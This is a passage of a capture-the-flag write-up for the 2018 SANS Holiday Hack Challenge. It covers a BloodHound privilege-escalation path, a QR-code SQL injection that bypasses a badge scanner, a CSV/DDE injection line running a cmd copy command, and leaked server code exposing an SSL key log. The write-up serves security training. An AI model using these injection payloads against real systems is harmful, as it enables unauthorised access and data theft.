<div id="outline-container-org1d18a71" class="outline-4">
<h4 id="org1d18a71">Background</h4>
<div class="outline-text-4" id="text-org1d18a71">
</div>
<ul class="org-ul">
<li><a id="org1230023"></a>Terminal Challenge<br />
<div class="outline-text-5" id="text-org1230023">
<div class="tip">
<p>
For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.
</p>

</div>
</div>
</li>
<li><a id="org87e3b1f"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org87e3b1f">
<p>
Holly has this for us:
</p>

<blockquote>
<p>
<a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound Tool</a> and <a href="https://youtu.be/gOpsLiJFI1o">Bloodhound Demo</a>
</p>
</blockquote>
</div>
</li>
</ul>
</div>
<div id="outline-container-org66b19df" class="outline-4">
<h4 id="org66b19df">Solution</h4>
<div class="outline-text-4" id="text-org66b19df">
<p>
To start, we download and run the VM.
</p>

<div class="note">
<p>
On the social medias, we read reports of people having issue
opening this VM. Some people suggested changing the architecture
to 64-bit, or using VMware instead.
</p>

</div>

<p>
When the VM launches, we're in a Slingshot Linux instance. We notice a shortcut to Bloodhound on the desktop:
</p>


<div class="figure">
<p><img src="./imgs/obj5_desktop.png" alt="obj5_desktop.png" width="500px" />
</p>
<p><span class="figure-number">Figure 23: </span>VM Launch Screen</p>
</div>

<p>
When we launch Bloodhound, we open up a dataset for
<code>AD.KRINGLECASTLE.COM</code>. Because Bloodhound is already installed,
and the data is pre-imported for us, we can skip ahead in the
video that Holly linked us to (around the 4:27 mark). We learn
that the quickest way to get started is to explore the Queries
tab. Our task is to find a path from a Kerberoastable user to the Domain Admins group. As we scroll down the Pre-Built Analytics Queries list, we see that there's a query for almost exactly that:
</p>


<div class="figure">
<p><img src="./imgs/obj5_query_graph.png" alt="obj5_query_graph.png" />
</p>
<p><span class="figure-number">Figure 24: </span>Shortest Paths to Domain Admins from Kerberoastable Users</p>
</div>

<p>
We see a few options, and a few paths. Our objective tells us one
further thing: "Remember to avoid RDP as a control path as it
depends on separate local privilege escalation flaws."
</p>

<p>
As we explore Bloodhound's interface, we find an Edge Filter option, and we can disable "CanRDP."
</p>


<div class="figure">
<p><img src="./imgs/obj5_filter.png" alt="obj5_filter.png" width="300px" />
</p>
<p><span class="figure-number">Figure 25: </span>Edge Filtering in Bloodhound</p>
</div>

<p>
This provides us with the following graph:
</p>


<div class="figure">
<p><img src="./imgs/obj5_result.png" alt="obj5_result.png" />
</p>
<p><span class="figure-number">Figure 26: </span>Bloodhound Result</p>
</div>

<p>
It looks like our answer is Leanne Dubej's user:
</p>
<div class="note">
<p>
LDUBEJ00320@AD.KRINGLECASTLE.COM
</p>

</div>

<p>
But what does this graph mean?
</p>

<ol class="org-ol">
<li>Leanne (LDUBEJ00320) is a member of the IT_00332 Active Directory group.</li>
<li>That group has Administrator privileges on the COMP00185 system.</li>
<li>Jena (JETAK00084) has an active session on the COMP00185 system.</li>
<li>Jena is a Domain Administrator.</li>
</ol>

<p>
Administrators have unfettered access to a system. One of their
superpowers is to be able to steal access tokens from other users
on that system, and impersonate them. Because Jena has an active
session on a system that Leanne is an admin on, Leanne could steal
Jena's token, and use it to perform actions as a domain admin.
</p>

<p>
The other remaining question is what exactly is meant by a
"Kerberoastable" user? Kerberoast is "a series of tools for
attacking MS Kerberos implementations." If an account has a
Service Principal Name (SPN) associated with it, it's vulnerable
to offline cracking attacks. Kerberoastable users are simply users
that have SPNs associated with their accounts. In our case, Leanne
has an SPN, and if we use Kerberoast to access her account,
Bloodhound has found a path for us to elevate all the way to
Domain Admin.
</p>
</div>
</div>
</div>
<div id="outline-container-org573cf48" class="outline-3">
<h3 id="obj6"><a id="org573cf48"></a>Badge Manipulation</h3>
<div class="outline-text-3" id="text-obj6">
<div id="text-table-of-contents">
<ul>
<li><a href="#orgab3893f">Goal</a></li>
<li><a href="#orga49cf76">Background</a></li>
<li><a href="#org94aa2f0">Solution</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgab3893f" class="outline-4">
<h4 id="orgab3893f">Goal</h4>
<div class="outline-text-4" id="text-orgab3893f">
<div class="note">
<p>
Bypass the authentication mechanism associated with the room near
Pepper Minstix. <a href="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg">A sample employee badge is available</a>. What is the
access control number revealed by the door authentication panel?
</p>

</div>
</div>
</div>
<div id="outline-container-orga49cf76" class="outline-4">
<h4 id="orga49cf76">Background</h4>
<div class="outline-text-4" id="text-orga49cf76">
</div>
<ul class="org-ul">
<li><a id="orge9082a5"></a>Terminal Challenge<br />
<div class="outline-text-5" id="text-orge9082a5">
<div class="tip">
<p>
For hints on achieving this objective, please visit Pepper Minstix
and help her with the Yule Log Analysis Cranberry Pi terminal
challenge.
</p>

</div>
</div>
</li>
<li><a id="orga623b8e"></a>Elf Chat<br />
<div class="outline-text-5" id="text-orga623b8e">
<p>
After we identify the targeted account in the Yule Log Analysis terminal, Pepper points us to the following resources:
</p>

<blockquote>
<p>
All of the Kringle Castle employees have these cool cards with QR
codes on them that give us access to restricted areas.
</p>

<p>
Unfortunately, the badge-scan-o-matic said my account was disabled
when I tried scanning my badge.
</p>

<p>
I really needed access so I tried scanning several QR codes I made
from my phone but the scanner kept saying "User Not Found".
</p>

<p>
I researched a SQL database error from scanning a QR code with
special characters in it and found it may contain an injection
vulnerability.
</p>

<p>
I was going to try some variations I found on <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass">OWASP</a> but decided to
stop so I don't tick-off Alabaster.
</p>
</blockquote>
</div>
</li>
<li><a id="org8503f96"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org8503f96">
<p>
Pepper links us to: <a href="https://www.the-qrcode-generator.com/">Creating QR barcodes</a> and <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass">SQL Injection</a>
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-org94aa2f0" class="outline-4">
<h4 id="org94aa2f0">Solution</h4>
<div class="outline-text-4" id="text-org94aa2f0">
<p>
Clicking on the Scan-O-Matic brings up the following interface:
</p>


<div class="figure">
<p><img src="./imgs/obj6_scanomatic.png" alt="obj6_scanomatic.png" width="500px" />
</p>
<p><span class="figure-number">Figure 27: </span>Scan-O-Matic in action</p>
</div>

<p>
As we interact with the scanner, we see there are two things we
can do: scan our fingerprint, or plug in a USB 3.0 drive. Scanning
our fingerprint processes the still from the video camera, while
the USB drive brings up a file selection window for a file upload.
</p>

<p>
The objective also gave us a sample employee badge:
</p>


<div class="figure">
<p><img src="./imgs/obj6_sample_badge.jpg" alt="obj6_sample_badge.jpg" />
</p>
<p><span class="figure-number">Figure 28: </span>If found, please return to Alabaster</p>
</div>

<p>
First thing we try is uploading the badge via the file upload functionality. No dice:
</p>


<div class="figure">
<p><img src="./imgs/obj6_error1.png" alt="obj6_error1.png" width="500px" />
</p>
<p><span class="figure-number">Figure 29: </span>Error 1: PNG files only</p>
</div>

<p>
That's fine. We can do some file conversion, either by "Save
As&#x2026;" or from the command line: <code>convert alabaster_badge.jpg
    alabaster_badge.png</code>. Now we're uploading the right format:
</p>


<div class="figure">
<p><img src="./imgs/obj6_error2.png" alt="obj6_error2.png" width="500px" />
</p>
<p><span class="figure-number">Figure 30: </span>Error 2: Authorized User Account Has Been Disabled!</p>
</div>

<p>
Perhaps Alabaster's access was revoked when he reported his badge
as stolen. These elves are really on top of security&#x2026;
</p>

<p>
Pepper's hints are pointing us towards SQL injection via the QR
code, so let's start by taking a closer look at the QR code on
Alabaster's badge. The <a href="https://www.the-qrcode-generator.com/">Creating QR barcodes</a> website she provided
also has a scan function (as do many cellphone camera apps). We
ended up using a different site, as we can just link to
Alabaster's badge URL, and we don't have to use our webcam. <a href="https://zxing.org/w/decode?u=https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg">The
results</a> are fairly cryptic, but they do seem to be plain text:
</p>

<pre class="example">
Decode Succeeded

Raw text	        oRfjg5uGHmbduj2m

Raw bytes          41 06 f5 26 66 a6 73 57   54 74 86 d6 26 47 56 a3
		   26 d0 ec 

Barcode format	QR_CODE
Parsed Result Type	TEXT
Parsed Result	oRfjg5uGHmbduj2m
</pre>

<p>
As we turn our attention to the <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass">OWASP</a> link she mentioned, we see this interesting looking snippet:
</p>


<div class="figure">
<p><img src="./imgs/obj6_owasp.png" alt="obj6_owasp.png" width="500px" />
</p>
<p><span class="figure-number">Figure 31: </span>Auth Bypass</p>
</div>

<p>
We can use the <a href="https://www.the-qrcode-generator.com/">Creating QR barcodes</a> website to create a new QR
code, with the snippet provided <code>or 1-- -' or 1 or '1"or 1 or"</code>,
and then save it (making sure to save it as a PNG). Now we can
upload our new code to the Scan-O-Matic:
</p>


<div class="figure">
<p><img src="./imgs/obj6_error2.png" alt="obj6_error2.png" width="500px" />
</p>
<p><span class="figure-number">Figure 32: </span>Error 2a: Authorized User Account Has Been Disabled!</p>
</div>

<p>
Same error. But, this wasn't a total failure. We've confirmed that
we can send arbitrary text as a QR code. Let's take a step back,
and simplify our injection attempt. The OWASP webpage has several
good examples, but let's just send the simplest case: <code>'</code>.
</p>


<div class="figure">
<p><img src="./imgs/obj6_error3.png" alt="obj6_error3.png" width="500px" />
</p>
<p><span class="figure-number">Figure 33: </span>Error 3: Exception at line 96</p>
</div>

<pre class="example">
EXCEPTION AT (LINE 96 "user_info = 
  query("SELECT first_name,last_name,enabled FROM employees WHERE 
	 authorized = 1 AND uid = '{}' LIMIT 1".format(uid))"):
(1064, u"You have an error in your SQL syntax; check the manual 
	 that corresponds to your MariaDB server version for the 
	 right syntax to use near '''' LIMIT 1' at line 1")"
</pre>

<p>
The error is hard to read as it scrolls across, but we can use the
<code>Network</code> Developer Tools tab to view the whole thing. Still, it's
hard to parse, so we'll take a closer look. It's an error from the
MariaDB (née MySQL) database server. We also see a code snippet from Scan-O-Matic:
</p>

<div class="org-src-container">
<pre class="src src-python">query(<span style="color: #8b2252;">"SELECT first_name,last_name,enabled FROM employees WHERE </span>
<span style="color: #8b2252;">       authorized = 1 AND uid = '{}' LIMIT 1"</span>.<span style="color: #483d8b;">format</span>(uid))<span style="color: #8b2252;">"</span>
</pre>
</div>

<p>
From this, we can figure out the database query was something like:
</p>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">SELECT</span> first_name,last_name,enabled <span style="color: #a020f0;">FROM</span> employees <span style="color: #a020f0;">WHERE</span> authorized = 1 <span style="color: #a020f0;">AND</span> uid = <span style="color: #8b2252;">'$QR_UID'</span> <span style="color: #a020f0;">LIMIT</span> 1
</pre>
</div>

<p>
The QR code seems to supply the <code>uid</code> parameter (this is the only
variable on that line; everything else is hard-coded). When we
submitted a <code>uid</code> of just a single-quote, the SQL database server
complained of a syntax error. Let's play around with this a little
bit, to better understand what's going on. A good tool for this is
<a href="https://sqltest.net/">sqltest.net</a>. From the query, we know that we're searching the
<code>employees</code> table. The query is requesting the fields
<code>first_name</code>, <code>last_name</code>, <code>enabled</code> be returned, and it's
filtering on the fields <code>authorized</code> and <code>uid</code>. So we can mock up
a simple example (in fact the example when we load <a href="https://sqltest.net/">sqltest.net</a>
already is pretty close, as it has <code>id</code>, <code>first_name</code>, and
<code>last_name</code>).
</p>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">CREATE</span> <span style="color: #a020f0;">TABLE</span> <span style="color: #0000ff;">employees</span>
(
      uid        <span style="color: #228b22;">VARCHAR</span>(30), 
      first_name <span style="color: #228b22;">VARCHAR</span>(30),
      last_name  <span style="color: #228b22;">VARCHAR</span>(30),
      authorized <span style="color: #228b22;">INT</span>,
      enabled    <span style="color: #228b22;">INT</span>
); 

<span style="color: #b22222;">-- We have the UID from Alabaster's badge, and we know he's been disabled</span>
<span style="color: #a020f0;">INSERT</span> <span style="color: #a020f0;">INTO</span> `employees` 
    (`uid`, `first_name`, `last_name`, `authorized`, `enabled`) 
<span style="color: #a020f0;">VALUES</span> 
    (<span style="color: #8b2252;">'oRfjg5uGHmbduj2m'</span>, <span style="color: #8b2252;">'Alabaster'</span>, <span style="color: #8b2252;">'Snowball'</span>, 1, 0);

<span style="color: #b22222;">-- We create an employee who is authorized and enabled</span>
<span style="color: #a020f0;">INSERT</span> <span style="color: #a020f0;">INTO</span> `employees` 
    (`uid`, `first_name`, `last_name`, `authorized`, `enabled`) 
<span style="color: #a020f0;">VALUES</span>
    (<span style="color: #8b2252;">'good_uid'</span>, <span style="color: #8b2252;">'Pepper'</span>, <span style="color: #8b2252;">'Minstix'</span>, 1, 1);
</pre>
</div>

<p>
We decided to make the <code>authorized</code> and <code>enabled</code> fields integers
because the query has <code>authorized = 1</code>. The lack of quotes tells
us it's not a string.
</p>

<p>
We'll start by trying our query with the UID from Alabaster's badge: <code>SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = 'oRfjg5uGHmbduj2m' LIMIT 1;</code>:
</p>


<div class="figure">
<p><img src="./imgs/obj6_sqltest1.png" alt="obj6_sqltest1.png" />
</p>
<p><span class="figure-number">Figure 34: </span>Sending Alabaster's badge to sqltest.net</p>
</div>

<p>
We got our expected result, but Alabaster's not enabled. Now let's
try sending a single quote, and see if we can duplicate the error
message:
</p>


<div class="figure">
<p><img src="./imgs/obj6_sqltest2.png" alt="obj6_sqltest2.png" />
</p>
<p><span class="figure-number">Figure 35: </span>Sending a single quote to sqltest.net</p>
</div>

<p>
We get the following error message, which matches almost exactly
the error message we got from Scan-O-Matic: =You have an error in
your SQL syntax; check the manual that corresponds to your MySQL
server version for the right syntax to use near '''' LIMIT 1' at
line 2=. The cause of the error is that we've created a query with
a string that doesn't close (there's no closing single-quote).
</p>

<p>
We've discovered a SQL injection! Now we need to exploit it to
gain access to the door. We start by trying the following query:
</p>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">SELECT</span> first_name,last_name,enabled <span style="color: #a020f0;">FROM</span> employees 
  <span style="color: #a020f0;">WHERE</span> authorized = 1 <span style="color: #a020f0;">AND</span> uid = <span style="color: #8b2252;">''</span> <span style="color: #a020f0;">OR</span> uid != <span style="color: #8b2252;">''</span> <span style="color: #a020f0;">LIMIT</span> 1;
</pre>
</div>

<p>
We're looking for an authorized user, whose uid is either empty or not empty. In other words, this should match everyone.
</p>


<div class="figure">
<p><img src="./imgs/obj6_sqltest3.png" alt="obj6_sqltest3.png" />
</p>
<p><span class="figure-number">Figure 36: </span>Matching anyone on sqltest.net</p>
</div>

<p>
Well, no more error, but we still only get Alabaster's user. Even
though our search should match everyone, the <code>LIMIT 1</code> clause will
only return one result, and just our luck, that one result is not
enabled. No problem &#x2013; we can just also require that the user be enabled:
</p>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">SELECT</span> first_name,last_name,enabled <span style="color: #a020f0;">FROM</span> employees 
  <span style="color: #a020f0;">WHERE</span> authorized = 1 <span style="color: #a020f0;">AND</span> uid = <span style="color: #8b2252;">''</span> <span style="color: #a020f0;">OR</span> enabled = 1 <span style="color: #a020f0;">OR</span> uid = <span style="color: #8b2252;">''</span> <span style="color: #a020f0;">LIMIT</span> 1;
</pre>
</div>

<p>
This query seems a bit repetitive, and it is, because we're
limited in what queries we can build. What we're searching on is
that a user must have an empty <code>uid</code> <span class="underline">OR</span> be enabled <span class="underline">OR</span> have an
empty <code>uid</code>. We're not sure if anyone has an empty <code>uid</code>, but the
user that's returned matches the other criteria: their account is enabled.
</p>


<div class="figure">
<p><img src="./imgs/obj6_sqltest4.png" alt="obj6_sqltest4.png" />
</p>
<p><span class="figure-number">Figure 37: </span>Requiring an enabled user on sqltest.net</p>
</div>

<p>
We found a query which works in our little sandbox, but how do we
make it work on Scan-O-Matic? We start by comparing the queries:
</p>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #b22222;">-- Scan-O-Matic:</span>
<span style="color: #a020f0;">SELECT</span> first_name,last_name,enabled <span style="color: #a020f0;">FROM</span> employees
 <span style="color: #a020f0;">WHERE</span> authorized = 1 <span style="color: #a020f0;">AND</span> uid = <span style="color: #8b2252;">'$QR_UID'</span> <span style="color: #a020f0;">LIMIT</span> 1;

<span style="color: #b22222;">-- Our query:</span>
<span style="color: #a020f0;">SELECT</span> first_name,last_name,enabled <span style="color: #a020f0;">FROM</span> employees 
  <span style="color: #a020f0;">WHERE</span> authorized = 1 <span style="color: #a020f0;">AND</span> uid = <span style="color: #8b2252;">''</span> <span style="color: #a020f0;">OR</span> enabled = 1 <span style="color: #a020f0;">OR</span> uid = <span style="color: #8b2252;">''</span> <span style="color: #a020f0;">LIMIT</span> 1;
</pre>
</div>

<p>
The UID from the QR code gets put in between single quotes, which
is why our query was rather odd. We needed to construct it in such
a way so that it would both start and end with a string.
</p>

<p>
So, if we just set the <code>uid</code> parameter to <code>' OR enabled = 1 OR uid
    ='</code>, we should be able to run this query on Scan-O-Matic:
</p>


<div class="figure">
<p><img src="./imgs/obj6_success.png" alt="obj6_success.png" width="500px" />
</p>
<p><span class="figure-number">Figure 38: </span>Access Granted!</p>
</div>

<div class="note">
<p>
User Access Granted - Control number <span class="underline">19880715</span>
</p>

</div>
</div>
</div>
</div>
<div id="outline-container-org06a529d" class="outline-3">
<h3 id="obj7"><a id="org06a529d"></a>Careers</h3>
<div class="outline-text-3" id="text-obj7">
<div id="text-table-of-contents">
<ul>
<li><a href="#orgd880439">Goal</a></li>
<li><a href="#org2d1db58">Background</a></li>
<li><a href="#org9501c9e">Solution</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgd880439" class="outline-4">
<h4 id="orgd880439">Goal</h4>
<div class="outline-text-4" id="text-orgd880439">
<div class="note">
<p>
Santa uses an Elf Resources website to look for talented information
security professionals. <a href="https://careers.kringlecastle.com/">Gain access to the website</a> and fetch the
document <code>C:\candidate_evaluation.docx</code>. Which terrorist
organization is secretly supported by the job applicant whose name
begins with "K." 
</p>

</div>
</div>
</div>
<div id="outline-container-org2d1db58" class="outline-4">
<h4 id="org2d1db58">Background</h4>
<div class="outline-text-4" id="text-org2d1db58">
</div>
<ul class="org-ul">
<li><a id="orga8c9f67"></a>Terminal Challenge<br />
<div class="outline-text-5" id="text-orga8c9f67">
<div class="tip">
<p>
For hints on achieving this objective, please visit Sparkle
Redberry and help her with the Dev Ops Fail Cranberry Pi terminal
challenge.
</p>

</div>
</div>
</li>
<li><a id="orgc1fe206"></a>Elf Chat<br />
<div class="outline-text-5" id="text-orgc1fe206">
<p>
Sparkle helpfully points out that her OpSec isn't as bad as Tangle's, by saying:
</p>

<blockquote>
<p>
I wonder if Tangle Coalbox has taken a good look at his own employee import system.
</p>

<p>
It takes CSV files as imports. That certainly can expedite a process, but there's danger to be had.
</p>

<p>
I'll bet, with the right malicious input, some naughty actor could exploit a vulnerability there.
</p>

<p>
I'm sure the danger can be mitigated. OWASP has guidance on what not to allow with such uploads.
</p>
</blockquote>
</div>
</li>
<li><a id="org16593b3"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org16593b3">
<p>
Sparkle also points us to the <a href="https://www.owasp.org/index.php/CSV_Injection">OWASP CSV Injection Page</a>, and tells us:
</p>

<blockquote>
<p>
Somehow Brian Hostetler is giving a talk on CSV injection WHILE
he's giving a talk on Trufflehog. Whatta' guy!
</p>
</blockquote>
</div>
</li>
<li><a id="orgdc0efad"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-orgdc0efad">
<p>
<a href="https://www.youtube.com/watch?v=myKrWVaq3Cw">Brian Hostetler, Buried Secrets: Digging Deep Through Cloud Repositories</a>
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-org9501c9e" class="outline-4">
<h4 id="org9501c9e">Solution</h4>
<div class="outline-text-4" id="text-org9501c9e">
<p>
Bringing up the webpage, we're presented with a simple form:
</p>


<div class="figure">
<p><img src="./imgs/obj7_main_page.png" alt="obj7_main_page.png" width="500px" />
</p>
<p><span class="figure-number">Figure 39: </span>Elf Resources website home</p>
</div>

<p>
Filling in the form, the page forces us to attach a file before
submitting. If we do that, we receive the following message:
</p>


<div class="figure">
<p><img src="./imgs/obj7_submitted.png" alt="obj7_submitted.png" width="650px" />
</p>
<p><span class="figure-number">Figure 40: </span>Elf Resources submission message</p>
</div>

<p>
Both the objective and the submission message told us the file we
need to retrieve, <code>C:\candidate_evaluation.docx</code>. We next simply
tried <a href="https://careers.kringlecastle.com/candidate_evaluation.docx">https://careers.kringlecastle.com/candidate_evaluation.docx</a>,
and got the following:
</p>


<div class="figure">
<p><img src="./imgs/obj7_404.png" alt="obj7_404.png" width="750px" />
</p>
<p><span class="figure-number">Figure 41: </span>Elf Resources 404</p>
</div>

<p>
What a helpful error message! Unfortunately, trying
<a href="https://careers.kringlecastle.com/public/candidate_evaluation.docx">https://careers.kringlecastle.com/public/candidate_evaluation.docx</a>
similarly doesn't work. But now, we know two critical pieces of information:
</p>

<ol class="org-ol">
<li>We're trying to access <code>C:\candidate_evaluation.docx</code></li>
<li>Files in <code>C:\careerportal\resources\public\</code> are publicly accessible via the web server.</li>
</ol>

<p>
Time to turn our attention to the hints, and see how we can get
our target file into the public directory. Brian's talk gives some
guidance on how to build a CSV to execute an arbitrary command. We
choose a name designed to not conflict with other KringleCon
attendees.
</p>

<pre class="example">
=cmd|'/C copy C:\\candidate_evaluation.docx C:\\careerportal\\resources\\public\\ZXNuZXRfc2VjdXJpdHkK.docx'!A0
</pre>

<p>
Uploading this file, we then try to access
<a href="https://careers.kringlecastle.com/public/ZXNuZXRfc2VjdXJpdHkK.docx">https://careers.kringlecastle.com/public/ZXNuZXRfc2VjdXJpdHkK.docx</a>. After
~10-15 seconds, we download a Word Doc. The download evaluates 4 elves, including Krampus:
</p>


<div class="figure">
<p><img src="./imgs/obj7_krampus.png" alt="obj7_krampus.png" width="750px" />
</p>
<p><span class="figure-number">Figure 42: </span>Krampus Evaluation</p>
</div>

<p>
The document reveals that Krampus is connected to cyber terrorist
organization <b>Fancy Beaver</b> (a play on the Fancy Bear APT group).
</p>

<p>
<b>Answer</b>:
</p>
<div class="note">
<p>
Fancy Beaver
</p>

</div>
</div>
</div>
</div>
<div id="outline-container-org035b965" class="outline-3">
<h3 id="obj8"><a id="org035b965"></a>PCAPalyzer</h3>
<div class="outline-text-3" id="text-obj8">
<div id="text-table-of-contents">
<ul>
<li><a href="#orgbbe0b54">Goal</a></li>
<li><a href="#org578bb85">Background</a></li>
<li><a href="#org99967ca">Solution Part 1: Downloading the SSL Key Logfile</a></li>
<li><a href="#org446c7dc">Solution Part 2: Decrypting the Traffic</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgbbe0b54" class="outline-4">
<h4 id="orgbbe0b54">Goal</h4>
<div class="outline-text-4" id="text-orgbbe0b54">
<div class="note">
<p>
Santa has introduced a web-based packet capture and analysis tool
at <a href="https://packalyzer.kringlecastle.com">https://packalyzer.kringlecastle.com</a> to support the elves and
their information security work. Using the system, access and
decrypt HTTP/2 network activity. What is the name of the song
described in the document sent from Holly Evergreen to Alabaster
Snowball?
</p>

</div>
</div>
</div>
<div id="outline-container-org578bb85" class="outline-4">
<h4 id="org578bb85">Background</h4>
<div class="outline-text-4" id="text-org578bb85">
</div>
<ul class="org-ul">
<li><a id="org9895fc1"></a>Terminal Challenge<br />
<div class="outline-text-5" id="text-org9895fc1">
<div class="tip">
<p>
For hints on achieving this objective, please visit SugarPlum Mary
and help her with the Python Escape from LA Cranberry Pi terminal
challenge.
</p>

</div>
</div>
</li>
<li><a id="orga8a7d4c"></a>Elf Chat<br />
<div class="outline-text-5" id="text-orga8a7d4c">
<p>
After we help SugarPlum escape, she tells us:
</p>

<blockquote>
<p>
Yay, you did it! You escaped from the Python!
</p>

<p>
As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - <a href="https://packalyzer.kringlecastle.com/">Packalyzer</a>.
</p>

<p>
Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root.
</p>

<p>
Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code.
</p>

<p>
There was suspicious-looking development code using environment variables to store SSL keys and open up directories.
</p>

<p>
This elf then told me that manipulating values in the URL gave back weird and descriptive errors.
</p>

<p>
I'm hoping these errors can't be used to compromise SSL on the website and steal logins.
</p>

<p>
On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different!
</p>
</blockquote>
</div>
</li>
<li><a id="orgfb4702f"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-orgfb4702f">
<p>
<a href="https://www.youtube.com/watch?v=PC6-mn9g9Cs">Chris Elgee, HTTP/2: Because 1 Is the Loneliest Number</a>
</p>

<p>
<a href="https://www.youtube.com/watch?v=YHOnxlQ6zec">Chris Davis, HTTP/2: Decryption and Analysis in Wireshark</a>
</p>
</div>
</li>
</ul>
</div>

<div id="outline-container-org99967ca" class="outline-4">
<h4 id="org99967ca">Solution Part 1: Downloading the SSL Key Logfile</h4>
<div class="outline-text-4" id="text-org99967ca">
<p>
A lot of hints on this one. We start by loading up Packalyzer, and
trying to find the HTML comments. We have access to two pages
initially, the home page, and the new user registration page. We
can't find any hidden comments in either one, so we go ahead and
register a new user, and then sign in with our new account.
</p>

<p>
At this point, the Packalyzer allows us to sniff 20 seconds of traffic, and then download the <abbr title="Packet Capture"> PCAP</abbr>.
</p>

<p>
Once we're authenticated, we can find the following comment in the page source:
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #b22222;">//</span><span style="color: #b22222;">File upload Function. All extensions and sizes are validated server-side in app.js</span>
$(<span style="color: #a020f0;">function</span> () {
    <span style="color: #8b2252;">'use strict'</span>;
    $(<span style="color: #8b2252;">'#fileupload'</span>).fileupload({
</pre>
</div>

<p>
<a href="https://packalyzer.kringlecastle.com/app.js">https://packalyzer.kringlecastle.com/app.js</a> doesn't work, but we
also noticed some resources being loaded from
<a href="https://packalyzer.kringlecastle.com/pub/">https://packalyzer.kringlecastle.com/pub/</a>, and we can recover
the server-side source code of <code>app.js</code> from
<a href="https://packalyzer.kringlecastle.com/pub/app.js">https://packalyzer.kringlecastle.com/pub/app.js</a>
</p>


<p>
Folllowing SugarPlum's hints, we found the comment, and grabbed
the server-side source code sitting in the web root. Now we need
to identify the environment variables used to store SSL keys:
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #a020f0;">const</span> <span style="color: #a0522d;">dev_mode</span> = <span style="color: #008b8b;">true</span>;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">key_log_path</span> = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">options</span> = {
  key: fs.readFileSync(__dirname + <span style="color: #8b2252;">'/keys/server.key'</span>),
  cert: fs.readFileSync(__dirname + <span style="color: #8b2252;">'/keys/server.crt'</span>),
  http2: {
    protocol: <span style="color: #8b2252;">'h2'</span>,         <span style="color: #b22222;">// </span><span style="color: #b22222;">HTTP2 only. NOT HTTP1 or HTTP1.1</span>
    protocols: [ <span style="color: #8b2252;">'h2'</span> ],
  },
  keylog : key_log_path     <span style="color: #b22222;">//</span><span style="color: #b22222;">used for dev mode to view traffic. Stores a few minutes worth at a time</span>
};
</pre>
</div>

<p>
Let's take this line by line. In the development copy we have,
<code>dev_mode</code> is set to true. <code>key_log_path</code> uses some short-hand
syntax, which could also be written as:
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #a020f0;">if</span> ( dev_mode )
    <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">key_log_path</span> = __dirname + process.env.DEV + process.env.SSLKEYLOGFILE;
</pre>
</div>

<p>
Finally, once <code>key_log_path</code> is set, the comment tells us that
it's used to view traffic. Our hints seem to point us to
recovering this file, and then using it to decrypt the
traffic. Perhaps the file was left over from development. We need
to figure out what the environment variables <code>DEV</code> and
<code>SSLKEYLOGFILE</code> were set to.
</p>

<p>
The main logic of the file is the <code>router.get</code> function. An annotated version is:
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #b22222;">//</span><span style="color: #b22222;">Route for anything in the public folder except index, home and register</span>
router.get(env_dirs,  <span style="color: #a020f0;">async</span> (ctx, next) =&gt; {
    <span style="color: #a020f0;">try</span> {
        <span style="color: #a020f0;">var</span> <span style="color: #a0522d;">Session</span> = <span style="color: #a020f0;">await</span> sessionizer(ctx);

        <span style="color: #b22222;">// </span><span style="color: #b22222;">Splits the web path into an array delimited by /</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">e.g. /pub/dir/../file -&gt; ["pub", "dir", "..", "file"]</span>
        <span style="color: #a020f0;">let</span> <span style="color: #a0522d;">split_path</span> = ctx.path.split(<span style="color: #8b2252;">'/'</span>).clean(<span style="color: #8b2252;">""</span>);

        <span style="color: #b22222;">//</span><span style="color: #b22222;">Grabs directory which should be first element in array</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">e.g. ["pub", "dir", "..", "file"] -&gt; "PUB"</span>
        <span style="color: #a020f0;">let</span> <span style="color: #a0522d;">dir</span> = split_path[0].toUpperCase();

        <span style="color: #b22222;">// </span><span style="color: #b22222;">Removes the first element of the array</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">e.g. ["pub", "dir", "..", "file"] -&gt; ["dir", "..", "file"]</span>
        split_path.shift();

        <span style="color: #b22222;">// </span><span style="color: #b22222;">e.g. ["dir", "..", "file"] -&gt; "/dir/../file"</span>
        <span style="color: #a020f0;">let</span> <span style="color: #a0522d;">filename</span> = <span style="color: #8b2252;">"/"</span> + split_path.join(<span style="color: #8b2252;">'/'</span>);

